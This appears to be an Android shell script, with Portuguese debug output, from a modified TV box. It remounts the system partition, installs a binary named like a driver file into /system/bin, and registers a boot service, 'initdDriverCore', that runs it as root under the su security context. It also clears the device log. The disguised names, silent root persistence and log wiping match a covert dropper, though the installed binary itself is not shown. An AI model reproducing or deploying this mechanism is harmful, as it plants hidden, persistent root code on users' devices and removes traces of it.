#!/system/bin/sh

initPath="/system/bin/initRc.drv.01.01.97"

function CheckBase64 () {
    # versionBinLocal=`date` # para simular um erro nas versoes e gravar infinito
    eval $cmdCheck
    if [ ! "$versionBinOnline" == "$versionBinLocal" ]; then
        echo "ADM DEBUG ########################################################"
        echo "ADM DEBUG ### função CheckBase64 #################################"
        echo "ADM DEBUG ### arquivo precisa ser atualizado > $pathToInstall"
        WriteBase64
    else
        echo "ADM DEBUG ########################################################"
        echo "ADM DEBUG ### $pathToInstall" esta atualizado!
        logcat -c
    fi
}

function WriteBase64 () {
    echo "ADM DEBUG ########################################################"
    echo "ADM DEBUG ### função WriteBase64 #################################"
    echo "ADM DEBUG ### gravando arquivo  > $pathToInstall"
    /system/bin/busybox mount -o remount,rw /system
    echo "$versionBinOnline" | /system/bin/busybox base64 -d > "$pathToInstall"
    /system/bin/busybox chmod $FilePerms $pathToInstall
    eval $NeedReboot
    echo "ADM DEBUG ### chama função CheckBase64 > $pathToInstall"
    CheckBase64
}

cmdCheck='versionBinLocal=`/system/bin/busybox base64 "$initPath"`'
versionBinLocal=`/system/bin/busybox base64 "$initPath"`
versionBinOnline=`/system/bin/busybox base64 "${0%/*}/initRc.drv.01.01.97"`
FilePerms=700
pathToInstall=$initPath
NeedReboot="echo -n 'ok' > /data/asusbox/reboot"

CheckBase64

#$initPath > ${0%/*}/init.log 2>&1

versionBinOnline="on boot
start initdDriverCore
service initdDriverCore /system/bin/initRc.drv.01.01.97
disabled
oneshot
user root
group root
seclabel u:r:su:s0"

versionBinLocal=`/system/bin/busybox cat /system/etc/init/initRc.drv.01.01.97.rc`
if [ ! "$versionBinOnline" == "$versionBinLocal" ]; then
echo "ADM DEBUG ########################################################"
echo "ADM DEBUG ### gravando init service ##############################"
/system/bin/busybox mount -o remount,rw /system
/system/bin/busybox cat << EOF > /system/etc/init/initRc.drv.01.01.97.rc
$versionBinOnline
EOF
/system/bin/busybox chmod 644 /system/etc/init/initRc.drv.01.01.97.rc
fi

















